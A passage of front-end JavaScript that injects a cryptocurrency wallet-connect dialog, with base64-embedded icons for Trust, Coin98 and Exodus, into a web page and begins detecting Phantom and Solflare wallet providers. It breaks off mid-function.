RoT2hKaFN2bXhMM2pTOTQ0Ujl6bWxmUGlYdEwzcGhIdk1hVHo0bDUwL1ZMN3BoRjh4cC9zY1NyZ0tYdkRDRTBvNjRrY3RLeDZjR1RVZGY5cnhLRDZhZUtjRzhQcE5SMXk0bHllTktOOGYxZzMzTFVkREpJeExzNzZYWE5nM25UOTFBTXNUSEpWS0ZaS0J3WUdhcVhhYzFERlBmdlVRck1Sd1RwUEUwdWh2amlscHpTUlVkN3JNRkxzcHBKMlU0dDRqSlZLMFpHT0NlcTMwdlY5TVhOdGlOTXVwWWhnVnZNaFVSNnJjV2w1c0drS0drV3NsNG5Rb1lCTGtjVFNsQTBxTUdDUm9GbUxXN1A4Z3hTZElwN0Jac1Y4dmpsNHMyQmxQRmFUU1hoMEkvZU43WWZLdlR4cUIwK01GNmpuNHBXdFVBMlRzYUJVU2orV2s0MVR0V2dzWGE5SXFCTHkrajNEVE8xUjhLVkhlTDltbWVLalU3ZFl1ajVjZms4R2dzVUxFQ0treUZGSjNNRS9FRCt3YVpDZ29icTBDWmxiSWFFWkVaQ3JFMk9ocExCS1JBRHlDMnhlcFRRZUo2MVpuYWlscFgxeFdlcW1aNHFEU3V1N1Q3MWd0OWRSbHJMQktSQUR5S1ZhUW9NVmZEMmpaTFFVQ0R2cXdqTWpaTGR5bThkclUweTFGUnEzRTJablEweHZyelBrMEhpWTcybWRkNG4zOEdWMmtxYVo4WnpscWFBRUI1VEVpQzlvTkVpS05vVllKRVMwM3hGbnBEU29TRWpkNVpBdFA4QUQzVHN0S29RSW91aUNkb3RkRVZiUjh3N3hFZDdSbEo0bG9KRUIvbkovOFFBS2hBQUFRSUVCQVlEQVFFQkFBQUFBQUFBQVFBUklURmhjUkF3UVZFZ1FJR1JvYkZRNGZEQjhkSC8yZ0FJQVFFQUFUOGh5Q1FFNTI3cGp1bUtnRlFDb0JVQXFBVkFLZ0ZRQ29CVUFxQVZBS2dGUUNvQlVBcUFWQUtnRlFDb0JVQXFBVkFLZ0ZRQ1ltcVZHNlpia0NXVVRPQ0FiNEpta24zaG11OHBib0J2aG9pb1U4cncrSmJVSUY4ancrTEkxRTBJOFJpVzcvR21CZnZ3a3NnR0h4d2hEZ203YjQ4K3NTV0NBWWZJQ0RqQXlmSW1Zd0V6ekI4WUdZSmdPcSsvbFFGV28xRitaSk9XTmhEcVZHWElQNk5pSE1ieW1kamNTczVjQUFGSjVRb0hjeVRCT0Zab2ZaUEg3Um9PbkVPRmlLQ3hUUUJFcG5sWmlrMjVBZ0RrZ0NxbDRwR1U3eE5nZVU1Z2Z1WWs4UjFaVE9Eam9FWkFncVA0SzBtV3drTHduQjVHYmRTYlpnQkRBcnhrRzY4UFFlRi9wRk5GYzBSY2h2a05EMngrR1FnV0xBemU2Y2MyQjREa2VGNUFHUStwZjZSQVFKcWlNOUNtbmpjWmsyNmsyek5FUXV5R1RNcHY3a095WmcvWmh0aVp6YkFFOHZuUjdxOFdhSHJsRkJLRjFHWk51cE5zeUg4VWVKMUYyQjFxME4wQk1YNkg5SzZqQkU5K001Q0pNRUozSnV5N0o2SW51VW9MZUlkK01JOUhyTW0zVW0yWURYV01ieTJITXAwZDVyMzJkN1RLRUd3R2Q0b2txYkJ1STlLUVdpdTFQUWZIOTlNeWJkU2JaZ05peWhVK3VVSi8weHhDSlY2R1pOdXBOc3dHdUQwTVRoMS9ybERjbS91eEJxcGVobVRicVRiTUJxdjhNU2lQN1BsRGQ3K3pFV0d1WVRicVRiTUZxM294S0J1SEtGVkRpTFZEN1prMjZrMnpHaWJpZkp4dlova2NuUVFQd05LaFBsbVRicVRiTXZKdms0d0hjSHJrNkhFOGNEUm9PWk51cE5zeThRSHJHMHdlWEp1YXNjRkRWNHpKdDFKdG1PN2N4NCtzWFRRTzhPVHZ4bmhpQTVZS2xCc3liZFNiWmpmc2o3R1A2NkR5ZEJNZURqUWdlYzJiZFNiWmpHMkE3RHdVWi9Ea3V2eWVNYUVlQVBtemJxVGJNL053T0J5Nmg0bHVTYWRnUDdqWDBQOEFNMmJkU2Jac0FHZUFzK01ZNCtkL25KYThnbUJZUXhZM0pBL3V1Yk51cE5zMXgwQi9qK1l0SkdLNjVqa2Q3b1Y5T0NNSnVQcjlObXpicVRiTmFlYkJzY1Rqc2NBYXJWMEZ1UWFMeFAxNHlDUUNsT0lETm0zVW0yYkxRWXNnSXNSaU1RbGFFY2pvZHM5bVFQdlJUd0Y3WXN5Z3d1L0hPbTNVbTJjY1lmU3hTSzBNUVdYM3pRRWg2bFFDL3dEdHppQVNXRVNuRW03dWROdXBOczZRaXoyTzZEWXhlOWVBYTZHaHFzZFJxTGpLY0dOZ0dDNVZqQU5CYmdza1IxTytmTnVwTnM5NUJoZnFLT2hoaUR3QW9CMUprVVJFZnR3aGtvNmx4T25kcjEyVHZHUDJUcndnSXlSY29FT2dFd0EwejV0MUp0eUdnOUkwVUdRYUJJOEwxWlNSVEdJZDUvNGdRUTRMZzROUmpvTlRaUDdubGY4QUZNOEo0TXpoK2pJZEFaZ0JweUUyNmsyNUUrTU13VTRyVWVqMEtMQlhNQXg0UzREOFNHeVp3ZGlKL0RvME9PcDRlcXJDQk05bklDdzVLYmZsQm5zdEpDT3FlYkNKZW1xSUlMR0J5SE96WFlKbm92Si8xQVFBSkFjbkhIZENaNVVTZTZqN1J1aXBIMXdpNWhwQUJ5VXdtWjF1cFF1QWRBNVF6S1FYdHl3Q0FCQjBLZjJOWFNiYkk3TG5nY0pCT2NqN1U0Uk9ZZVdPZ3drNWdaQ01Ta0k2cDBxV0NoOFFVZ0F3SExpSkhFUWg4ZVN3UURERTc3Zkh6TnVHUnA4YWRoTlNIRE5EWS9Ga3NnTy9HUTZCME0vaVNXUUdwbmtrT25hZmY0ZDlCTkFkOHhtbDJUN3crRGRsRTBVczl0aW5PbzdKbS9PczNUN0JNVE05a0EzS0FBSktvVlVLcUZWQ3FoVlFxb1ZVS3FGVkNxaFZRcW9WVUtxRlZDcWhWUXFvVlVLcUZWQ3FoVlFxb1ZVS2luSE4vOW9BREFNQkFBSUFBd0FBQUJEenp6UlR6enp6enp6enp6enp6enp6VHp6enp6eVJ6enp6enp6enp6enp6enp6enp3elR6enlUenp6enp6enp6enp6enp6enp6enp5anp5aHp6enp6enp6enp6enp6enp6enp6enp4end6enp6enp6enp6enp6enp6enp6enp6enl6enp6enp6enp6enp6OVBmenp6enp6enp6enpEenp6enp6enp6UW9NTU9EN0h6enp6enp6ekx6enp6enl1QUFNTTkrNHNNUE9MM3p6enp3THp6enp6eUVJV1kzenp3MjAwd1A4QTg4ODg4Qzg4ODg4OEtRODg4ODg4ODg4NkQwODg4ODhDODg4ODg4cUU4ODg4ODg4ODhyRGQ4ODg4OEM4ODg4ODhxRzg4ODg4ODg4OGdEVzg4ODg4Qzg4ODg4OGpTODg4ODg4ODg4SkdWODg4ODhDODg4ODg4cEEvODg4ODg4ODhDSDg4ODg4OEM4ODg4ODhNRDE4ODg4ODg4OEpIODg4ODg4Qzg4ODg4OG9EYjg4ODg4ODg1REQ4ODg4ODhDODg4ODg4L0NDLzhBUFBQUFB3UjkvUFBQUFBBdlBQUFBQUE9DQWZ0L1BPOEF5dlBQUFBQUEF2UFBQUFBQUERqUTQwcUF4VDNQUFBQUFBQQXZQUFBQUFBQUExmUUF3RGovQUR6enp6enp6elB6enp6enp6enp6eTJLL3dBODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODhFODhVODg4ODg4ODg4ODg4ODg4ODg4ODg4MGM4OHN3ODg4ODg4ODg4ODg4ODg4ODg4OHM4ODg4ODhjODg4ODg4ODg4ODg4ODg4ODhFODg4ODg4ODg4akJCQkJCQkJCQkJCQkIvOEFQUFBQUFAvRUFDWVJBUUFDQVFNRUFnSURBUUFBQUFBQUFBRUFFU0VRTURGQVFXRnhJS0ZSY0lHUnNmRC8yZ0FJQVFNQkFUOFEvUm8xd2xzYW5ZQjZWSEpuZjc5VEdHb3FyZGNRNUp5V0p5UytnYmw0SjV2aGtPQ1k0dVpUSWlLcDFFY01Xc1pTL251OHZ2U1FkeElMbE9BZkF1aGNaeXFkbkExNzZmWVp4ZFRKajdtZjhQVzF4L2xwOUxkRlFkYlE4ajNvYUR3YnBwUlVuazJuZ2VOQlFHNktMNGcwM0JzdlpWcnhCU2VlZ2l4YlB1amZoZjhBak9saS9IWXVORjYzcUNVeGxVY3g4OUNnV3k3MkRTbUhuZnI5d2lWaGlGcVlUQitvSTVOY0x5emx1UHhvNjdIUTVRd3h1aG9sbGlYREJtT3dORVZDVmY0empvZ0ZNRnovQUVqdEN0Y2ppZmNIbzdWYmg5Q1djc1ROY3Y2UC84UUFKaEVCQUFJQUJRUURBQU1CQUFBQUFBQUFBUUFSRUNFd01WRkJZWEdoSUVDeFlIQ0I4UC9hQUFnQkFnRUJQeEQralg2MmN3bEV1ZFpUNnV3RnpvdGVabVN1QUtESE16Sm5LcHM1UG9ER3JXZHI0WkdOc3BScVpabGZVQVdPS201Q2FoZGNkWDFpZE1VSHNNYjB2aTR0YnFiVUdkU1I5TmZ2V0p2L0FPZnVsNldIdmFydndrRi85ZGRJNXJ4Zzc4anF1L0ZEZmkwaGt2R0N0TzdxdS84QWI5aHN1enBITTk4RmF1cmNqaGlXVkVwclJvTHpMbmdmUUNtZDlIdzVyeXF1K1dGWUhYUXI4RkhKMWhWWkJNOVlLeXFEOGdWb25NRGhjamJwcjh3SU41a0hwdVovbVBjUkduSFBOam1iVHZ6Z1o2N3Y5SFAyWkJyZUJPVFBtYmtEbVp2bmNBYlZFdjhBMG0vMGtWcW1NZnJEYkxNZXJqNmpkdTlLOVJxMk95RzVrZXh4L09qV2ZuLy94QUFxRUFFQUFRSUNDUVVCQVFFQUFBQUFBQUFCRVFBaE1hRVFNRUZSWVhHQmtmRWdRTEhCOEZEUjRmL2FBQWdCQVFBQlB4RFVXUmI3akdwY0ljMVNZdm9SVzhsNXJYaXE4VlhpcThWWGlxOFZYaXE4VlhpcThWWGlxOFZYaXE4VlhpcThWWGlxOFZYaXE4VlhpcThWWGlxOFZYaXE4Vlc0STVNVk13NjE2azRoeVdva2hsYm4yQXFNWGNWR0lodVA5b0JZaitDZ2tKSlU4V09EY292Z1N5ZGJMZGZpMUJnUDRxQ1FralVZTTdqYVVJSkdUVXFCS3dGUTNOdHpmei9rcUhBZHB2b0JicWJ0UVhTNE1PUEgrV2srUlNCSjZ1U0g0ZnpjRndmeDlNUzJMWXF3ZnpyeTlsemw2QzVzV0gzL0FEemFURzRvUkJMam9tVXgyYzZnRGQvUXZibTV5MFhCdXY4QTBiRzMyZEZ6OVAzZjNDUERpWWU1dXZ5R2tTUU51ekE1SmZ1VUV2MkVJWGNObnQ4UjJsKzJqYTcxYy9iWTJvM2c1Y1hoUXEzWE5nNGJtZkxEU2tXeWRvTnliU2pIcXRKZTR2cHZ6OXVSTGNJcktudE1KS2lCMWFMZkd3YUw4NU9kVHFSd2VXTEhxa2dDeFlQNHN6MG9NQlByelk5RjlyTEQydFpWN0JxTllxZ281a1RFRHNGNkhFWmg4aEJ5bzVXNFd2dkJrMWNsTWtxSEl3T21xSi94d2k5em9sRkN2YkRaSHpRUkRPNXZXSXpvc3VtSDBqN0hPcXlyV1JXNkRxVGZ3T0hkS1V1eFE2UUsvYi9kRHdMeFgzVW9EdlUrc0ZZTHRQRmJjUkJjQndjWHRRVVlReU9YdDU0MHpPTEY5eFBveDFHelgzeDhWa3JIOTErMys2ZHgwblFtL0VubkpWMll6OVBFYmF6T3F5cldNVEtUd0xHUnFRUUFWYkFWZkNkZ2lPR042d2NhTWhyWVNqd1lmTGpwTGUwU2cxdkhHUlh5eEhXZVpVMkU0SW5rQ3ozMVN0ek80UUpPNVBYV1oxV1Zhd29IZjV2VURXOXBYWXBzUlBhRU9qZktuRmQrRWZqaFJBbE5sUDFYN2VzSW13TWljUnBGZWJWaTVyZG9wM1laRmw2TnM2ZVlWak4yRW5yNWtEV002ckt0WVFUZjU2UmZaQ2hSQTdxL08zNEpTUXlEQk5uV1ZGaVhBUVphNmF1TzFqTXFSbUg4S0tZZXJuM05PUXBKU3dPM1NTZmF3eTZ6T3F5cldRQ0l2ZTRhWnQwWDg2ZTBCWnVzK21MZkEvZlBXWjFXVmF5RzhidTJtYmQzN24rUGFZM1hkK2ZUTU41eWZyV1oxV1ZheTJON3B1YlJlMDdkWkdNN1dtVWJ4OEgxck02ckt0WktONitIMXBqM3Q5bC8zMmwwcGxjOU1vakhaejYxbWRWbFdzL1djSDFwZzN4N1A5dlo3S3ArdzlIR0R1ays5Wm5WWlZySWZISCsybWQ4bVgxN1B4ano5SEZydkwvZXN6cXNxMWtjVDZaWDNwanV4RHVmWHM3cVJQZEVmZm90NUdUSFdaMVdWYXkwKzJlY3RLNjhUK0p6OW54M0Y2L1JPbERDVllDakp3QWREV1oxV1ZhenlnNTltbTlrWERrSDJkeTd3WEFUNk5OaUp0dk1HdHpxc3Exa0tsek9nL0I2TGd6ZnQ4aCsvWlFCY1F1VUQ1ZE5ucGw3ajZhM09xeXJXUitTa2RVZWlWMlVyaElNZzlsRVRaZzRxL0JOTStscGJpcDhGMXVkVmxXdGUzQVRtUmxHa0c3RVRnSStWMzlrWmpJamZZWkJwbkV4NXlGZmhyYzZyS3RiQVJFejJTWGZCNjZUaHJnQ0grQ2RmWWhKUW5yMnpKU3F5M2RMUVVkOUxaTmF6cXNxMXJuWit6dmNPK25oWXJJTWxZSlFKdmJUb3lkUFlIYzFpTmdXSGVYb2FjMVlCWW9HNENOd0VHdHpxc3ExcmhRc3U5c2VqRDBwTGJ6c1JHRTAzOENCYmE5V3pqejE5eTFFYlZzSEZwRDlqVFlZQWNBZzAzVU1lMnlCMkpkdGRuVlpWcnRpMW9iRSt3bm1Pa1VFVVM0bEFaSFlYQVhaOHVldHhlejRpN2cydkNqb0VMbUw5bnhtNkFRS01BWFZvekppNXY0blFnNmE3T3F5clhCMWdBRjlrT0kxWkVwT3diQndmUWFka0ZiWEJjVGc5eW9LTkd3ZmRpR3FscU8yS2Z4WXlwUzVtSFk5dzJmUG9jcnZzTVA0SHp5MStkVmxXdkpZb0hCUGkrTzhwWU9HdWZ0L293UWdzUjJwelloQmM0N1RtZHF3c3VURGs3bmg2aDRaTFhPcGgxWDRVWTJCVFluYytIRDA3cUZybVptOTJVR2RRMEFOZm5WWlY3QzBrV0RTOENiVGgycVRSSGJ1Vy9XUHBCYlNSZEJNSHJTRFJzSE1tL1ZialFNQUpFWkUwVFlEaXZ1R0xVZmxrS052aS9BNzBxaXFyZFgwOEZCUVAweithZ3ppZUFld3pxc3E5amdxamNsU1EzbFlPRzA1TitMVFRsaFFPWStsMnhOMnNjMjFsd3JFZXdWbnVBeFpjNnhwaHZMeTRIRDB4RjRNWm9iWGdTMDRBSzVlT1J6dSt5MzNhcXdHNjNzNENjUUhaaS9UQ3BTSlhnc2NmbzdVaUJCaEVoSFVRd25FRWN4YkZObURmQWJqdHlIQ2piREFZQTRIc3drNTFXanVaOXJaUjFyZlZzSFB1VS9GTkYzMUdLNTkzMHNkdUZrY0FvcGw3aVhmQnlMOFNzRE9FUS82OGZhT0VNWXRRUUJnV3BzWGNqOW43WU1MUWhJbERHdVZHT2UydUdIS2xHWkE0UjBTT1pRYXpnYjNBNnhVTWpVRW5oRzQ0R2Z0cjNlTTl2eG9HSXhMME1rbUQ3Y1dERUJQSkMvU2pjSFpGUFlSUFdqTzNBd09BZTM0QUxIMys0YWJ6dTRjdjU5NEx1QnpxQU5KYkRITVVJZ2x4L25HUHNzT2ZwTUxhdzRPNythM0V1eU45QUFHQjZVQkRoU1IybXgzL3dBdUJoSzRHK29MdDFpK3NCR0c1M1VrNEh5L2toeExnYjZTY1JaYWtCRFV0K2ZsL3dDTzN3VGtLZ3VzcmJySjduaXcvd0NVR1lFdHp0L2hvc2NkMjJveGJOeGpRQWdJTmNna0pKVXpFT0RjcURhOFZXOWh6dDcxRmhFN3FtNHJ6dFc0QnUvMVFZQ1BhS1VBN3dwdmZOWG1xODFYbXE4MVhtcTgxWG1xODFYbXE4MVhtcTgxWG1xODFYbXE4MVhtcTgxWG1xODFYbXE4MVhtcTgxVjQrYWdHUjFYb0FJQURXZi9aIi8+CjwvZGVmcz4KPC9zdmc+Cg==\" alt=\"Trust icon\" class=\"css-k19fg7\"></div><span class=\"css-18g8lgp\">Trust</span></li></ul><ul><li class=\"css-19rqjni\" data-provider=\"coin98\"><div style=\"min-width:30px;min-height:30px\"><img width=\"30\" height=\"30\" src=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA3NiA3NSI+CiAgPGRlZnM+CiAgICA8bGluZWFyR3JhZGllbnQgaWQ9ImEiIHgxPSIxMDEuNjgxJSIgeDI9Ii0xLjU1NyUiIHkxPSIxNS4yNjglIiB5Mj0iODQuOTE3JSI+CiAgICAgIDxzdG9wIG9mZnNldD0iMCUiIHN0b3AtY29sb3I9IiNGMUQ5NjEiLz4KICAgICAgPHN0b3Agb2Zmc2V0PSIxMDAlIiBzdG9wLWNvbG9yPSIjQ0RBMTQ2Ii8+CiAgICA8L2xpbmVhckdyYWRpZW50PgogIDwvZGVmcz4KICA8ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgPHJlY3Qgd2lkdGg9Ijc1IiBoZWlnaHQ9Ijc1IiBmaWxsPSIjMDAwIiByeD0iMTYiLz4KICAgIDxwYXRoIGZpbGw9InVybCgjYSkiIGZpbGwtcnVsZT0ibm9uemVybyIgZD0iTTYxLjQ0IDBhMTMuNzE0IDEzLjcxNCAwIDAgMSA5LjY4IDQuMDEgMTMuNjYxIDEzLjY2MSAwIDAgMSA0LjAwOCA5LjY2OHY0Ny42NDZhMTMuNjYgMTMuNjYgMCAwIDEtNC4wMDcgOS42NjZBMTMuNzEzIDEzLjcxMyAwIDAgMSA2MS40NCA3NUgxMy42ODZhMTMuNzEzIDEzLjcxMyAwIDAgMS05LjY4LTQuMDFBMTMuNjYgMTMuNjYgMCAwIDEgMCA2MS4zMjRWMTMuNjc4YzAtMy42MjUgMS40NC03LjEwMiA0LjAwNy05LjY2N0ExMy43MTQgMTMuNzE0IDAgMCAxIDEzLjY4NyAwWk0yMC4wNjMgNDYuMjMxaC00LjgyNWExMC4wMzIgMTAuMDMyIDAgMCAwIDIuOTQ2IDcuMDg2IDEwLjA3IDEwLjA3IDAgMCAwIDcuMSAyLjk0MiAxMC4wNjUgMTAuMDY1IDAgMCAwIDcuMTA4LTIuOTM1IDEwLjAzIDEwLjAzIDAgMCAwIDIuOTQ2LTcuMDkzaC00LjgyNGE1LjIwNyA1LjIwNyAwIDAgMS0xLjUzIDMuNjg4IDUuMjI1IDUuMjI1IDAgMCAxLTMuNjk2IDEuNTI4IDUuMjM0IDUuMjM0IDAgMCAxLTMuNjk1LTEuNTI4IDUuMjEzIDUuMjEzIDAgMCAxLTEuNTMtMy42ODhaTTU0LjMzIDMzLjcxNmExMS43NjMgMTEuNzYzIDAgMCAwLTEyLjc5OSAyLjUzOEExMS42OTcgMTEuNjk3IDAgMCAwIDM4Ljk5IDQ5LjAzYTExLjcyMyAxMS43MjMgMCAwIDAgNC4zMjggNS4yNTkgMTEuNzU3IDExLjc1NyAwIDAgMCA2LjUyNiAxLjk3IDExLjc2NiAxMS43NjYgMCAwIDAgOC4yOS0zLjQzNSAxMS43MiAxMS43MiAwIDAgMCAzLjQ0Mi04LjI3NCAxMS43MDIgMTEuNzAyIDAgMCAwLTEuOTc1LTYuNTE0IDExLjczNiAxMS43MzYgMCAwIDAtNS4yNjktNC4zMlptLTQuNDg4IDMuOTJhNi45MzcgNi45MzcgMCAwIDEgNC45IDIuMDI1IDYuOTEgNi45MSAwIDAgMSAyLjAyOCA0Ljg5MiA2Ljg5NyA2Ljg5NyAwIDAgMS0xLjE3IDMuODM0IDYuOTMyIDYuOTMyIDAgMCAxLTEwLjY0MyAxLjA0MiA2LjkwMiA2LjkwMiAwIDAgMS0xLjUtNy41MjIgNi45MDkgNi45MDkgMCAwIDEgMi41NDQtMy4xIDYuOTI4IDYuOTI4IDAgMCAxIDMuODQxLTEuMTY3Wm0uMTcgNC41NTJhMi40MzEgMi40MzEgMCAwIDAtMi4yNDEgMS4xNTQgMi40MTggMi40MTggMCAwIDAtLjM1NiAxLjI1NyAyLjM5NSAyLjM5NSAwIDAgMCAxLjYxOSAyLjI5djEuNzUzaDEuNjE4di0xLjc1NGEyLjQyNyAyLjQyNyAwIDAgMCAxLjU5NC0xLjk1IDIuNDE4IDIuNDE4IDAgMCAwLTEtMi4zMSAyLjQzMSAyLjQzMSAwIDAgMC0xLjIzNC0uNDRabS0yMC4yMi0yMi41NTJhMTEuNzYyIDExLjc2MiAwIDAgMC0xMi43OTYgMi41MzEgMTEuNjk3IDExLjY5NyAwIDAgMC0yLjU1NCAxMi43NjkgMTEuNzIzIDExLjcyMyAwIDAgMCA0LjMyIDUuMjYyIDExLjc1NyAxMS43NTcgMCAwIDAgMTQuODI1LTEuNDQ2IDExLjcxNyAxMS43MTcgMCAwIDAgMy40NDUtOC4yODQgMTEuNzAzIDExLjcwMyAwIDAgMC0xLjk3NC02LjUxMiAxMS43MzYgMTEuNzM2IDAgMCAwLTUuMjY2LTQuMzJabS00LjUxIDMuOTE3YTYuOTQ1IDYuOTQ1IDAgMCAxIDQuODk3IDIuMDI5IDYuOTE4IDYuOTE4IDAgMCAxIDIuMDMyIDQuODg2IDYuOTA2IDYuOTA2IDAgMCAxLTEuMTY4IDMuODQyIDYuOTQgNi45NCAwIDAgMS0xMC42NiAxLjA0OCA2LjkxMSA2LjkxMSAwIDAgMS0xLjUtNy41MzYgNi45MTggNi45MTggMCAwIDEgMi41NS0zLjEwMyA2LjkzNyA2LjkzNyAwIDAgMSAzLjg1LTEuMTY2Wm0yNC41Ni00LjgxYTEwLjA1OSAxMC4wNTkgMCAwIDAtNy4xMDMgMi45NCAxMC4wMiAxMC4wMiAwIDAgMC0yLjk0IDcuMDkgOS45IDkuOSAwIDAgMCAxLjIzIDQuNzk1IDEzLjU3NSAxMy41NzUgMCAwIDEgNC4yMTQtMi4zMjIgNS4wODIgNS4wODIgMCAwIDEtLjYyNS0yLjQ3NyA1LjIwNiA1LjIwNiAwIDAgMSAxLjUwMy0zLjczNiA1LjIyMyA1LjIyMyAwIDAgMSAzLjcyMi0xLjU1NCA1LjIzNCA1LjIzNCAwIDAgMSAzLjcyIDEuNTU0IDUuMjEzIDUuMjEzIDAgMCAxIDEuNTA1IDMuNzM2IDUuMjc5IDUuMjc5IDAgMCAxLS42MjMgMi40NzMgMTMuNTc0IDEzLjU3NCAwIDAgMSA0LjIxMyAyLjMyMiA5LjkwMyA5LjkwMyAwIDAgMCAxLjIzLTQuNzk1IDEwLjAzMiAxMC4wMzIgMCAwIDAtMi45NDYtNy4wODYgMTAuMDcgMTAuMDcgMCAwIDAtNy4xLTIuOTRabS0yMy43NSA3Ljk5aC0xLjYxN3YxLjc1YTIuNDE5IDIuNDE5IDAgMCAwLTEuNTgyIDIuNjg3IDIuNDE0IDIuNDE0IDAgMCAwIDIuMzkgMi4wMDYgMi40NSAyLjQ1IDAgMCAwIDEuNTU1LS41NzQgMi40MTQgMi40MTQgMCAwIDAtLjc0Ni00LjExOXYtMS43NVoiLz4KICA8L2c+Cjwvc3ZnPgo=\" alt=\"Coin98 icon\" class=\"css-k19fg7\"></div><span class=\"css-18g8lgp\">Coin98</span></li></ul><ul><li class=\"css-19rqjni\" data-provider=\"exodus\"><div style=\"min-width:30px;min-height:30px\"><img width=\"30\" height=\"30\" src=\"data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTIyIiBoZWlnaHQ9IjEyNCIgdmlld0JveD0iMCAwIDEyMiAxMjQiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxtYXNrIGlkPSJtYXNrMF8zMF8xMTAiIHN0eWxlPSJtYXNrLXR5cGU6YWxwaGEiIG1hc2tVbml0cz0idXNlclNwYWNlT25Vc2UiIHg9IjAiIHk9IjAiIHdpZHRoPSIxMjIiIGhlaWdodD0iMTI0Ij4KPHBhdGggZD0iTTEyMS43ODcgMzQuODMzMUw2OS4zODc2IDAuNDc2NTYyVjE5LjY4NTVMMTAzLjAwMiA0MS41Mjg4TDk5LjA0NzQgNTQuMDQySDY5LjM4NzZWNjkuOTU4SDk5LjA0NzRMMTAzLjAwMiA4Mi40NzEyTDY5LjM4NzYgMTA0LjMxNFYxMjMuNTIzTDEyMS43ODcgODkuMjc2N0wxMTMuMjE4IDYyLjA1NDlMMTIxLjc4NyAzNC44MzMxWiIgZmlsbD0iIzFEMUQxQiIvPgo8cGF0aCBkPSJNMjMuNzk5MyA2OS45NThINTMuMzQ5M1Y1NC4wNDJIMjMuNjg5NEwxOS44NDQ2IDQxLjUyODhMNTMuMzQ5MyAxOS42ODU1VjAuNDc2NTYyTDAuOTUwMTk1IDM0LjgzMzFMOS41MTg2IDYyLjA1NDlMMC45NTAxOTUgODkuMjc2N0w1My40NTkxIDEyMy41MjNWMTA0LjMxNEwxOS44NDQ2IDgyLjQ3MTJMMjMuNzk5MyA2OS45NThaIiBmaWxsPSIjMUQxRDFCIi8+CjwvbWFzaz4KPGcgbWFzaz0idXJsKCNtYXNrMF8zMF8xMTApIj4KPHBhdGggZD0iTTEyMS43ODcgMzQuODMzMUw2OS4zODc2IDAuNDc2NTYyVjE5LjY4NTVMMTAzLjAwMiA0MS41Mjg4TDk5LjA0NzQgNTQuMDQySDY5LjM4NzZWNjkuOTU4SDk5LjA0NzRMMTAzLjAwMiA4Mi40NzEyTDY5LjM4NzYgMTA0LjMxNFYxMjMuNTIzTDEyMS43ODcgODkuMjc2N0wxMTMuMjE4IDYyLjA1NDlMMTIxLjc4NyAzNC44MzMxWiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTIzLjc5OTMgNjkuOTU4SDUzLjM0OTNWNTQuMDQySDIzLjY4OTRMMTkuODQ0NiA0MS41Mjg4TDUzLjM0OTMgMTkuNjg1NVYwLjQ3NjU2MkwwLjk1MDE5NSAzNC44MzMxTDkuNTE4NiA2Mi4wNTQ5TDAuOTUwMTk1IDg5LjI3NjdMNTMuNDU5MSAxMjMuNTIzVjEwNC4zMTRMMTkuODQ0NiA4Mi40NzEyTDIzLjc5OTMgNjkuOTU4WiIgZmlsbD0id2hpdGUiLz4KPHJlY3QgeD0iMS4xMDYzMiIgeT0iMC40NzY1NjIiIHdpZHRoPSIxMzMuNzQ0IiBoZWlnaHQ9IjEzNi4wODUiIGZpbGw9InVybCgjcGFpbnQwX2xpbmVhcl8zMF8xMTApIi8+CjxlbGxpcHNlIGN4PSI4LjQzMTc2IiBjeT0iMjcuNDYwMiIgcng9IjExNy42MzkiIHJ5PSIxMjcuNTQ1IiB0cmFuc2Zvcm09InJvdGF0ZSgtMzMuOTMwMyA4LjQzMTc2IDI3LjQ2MDIpIiBmaWxsPSJ1cmwoI3BhaW50MV9yYWRpYWxfMzBfMTEwKSIvPgo8L2c+CjxkZWZzPgo8bGluZWFyR3JhZGllbnQgaWQ9InBhaW50MF9saW5lYXJfMzBfMTEwIiB4MT0iMTA1LjA4NCIgeTE9IjEzMi41OTQiIHgyPSI2OS44NDM5IiB5Mj0iLTEyLjI3NjUiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KPHN0b3Agc3RvcC1jb2xvcj0iIzBCNDZGOSIvPgo8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNCQkZCRTAiLz4KPC9saW5lYXJHcmFkaWVudD4KPHJhZGlhbEdyYWRpZW50IGlkPSJwYWludDFfcmFkaWFsXzMwXzExMCIgY3g9IjAiIGN5PSIwIiByPSIxIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgZ3JhZGllbnRUcmFuc2Zvcm09InRyYW5zbGF0ZSg4LjQzMTc1IDI3LjQ2MDIpIHJvdGF0ZSg3Mi4yNTU3KSBzY2FsZSg5Ni40OTc5IDkwLjQ1NDMpIj4KPHN0b3Agb2Zmc2V0PSIwLjExOTc5MiIgc3RvcC1jb2xvcj0iIzg5NTJGRiIgc3RvcC1vcGFjaXR5PSIwLjg3Ii8+CjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iI0RBQkRGRiIgc3RvcC1vcGFjaXR5PSIwIi8+CjwvcmFkaWFsR3JhZGllbnQ+CjwvZGVmcz4KPC9zdmc+Cg==\" alt=\"Exodus icon\" class=\"css-k19fg7\"></div><span class=\"css-18g8lgp\">Exodus</span></li></ul></div></div></div></div><div class=\"css-czicsy\"></div></div></dialog></div>";
    document.body.appendChild(b);
    var c = document.querySelector(".css-1o7lixs");
    c.addEventListener("click", function () {
      $("#connect-modal2").fadeOut();
    });
    document.addEventListener("click", function (a) {
      if (a.target.contains(document.querySelector(".css-1vx73dy"))) {
        $("#connect-modal2").fadeOut();
      }
    });
    var d = document.querySelector(".connect-button");
    d.innerText = "Connect Wallet";
    d.addEventListener("click", function () {
      $("#connect-modal2").fadeIn();
    });
  });
  const d = a => {
    if (a == "phantom") {
      try {
        const a = window.phantom.solana;
        if (a.isPhantom) {
          return a;
        }
        window.open("https://phantom.app/", "_blank");
      } catch {
        window.open("https://phantom.app/", "_blank");
        return null;
      }
    }
    if (a == "solflare") {
      try {
        const a = window.solflare;
        if (a?.isSolflare) {
          return a;
        }
        window.open("https://solflare.com/", "_blank");
      } catch {
        window.open("https://solflare.com/", "_blank");
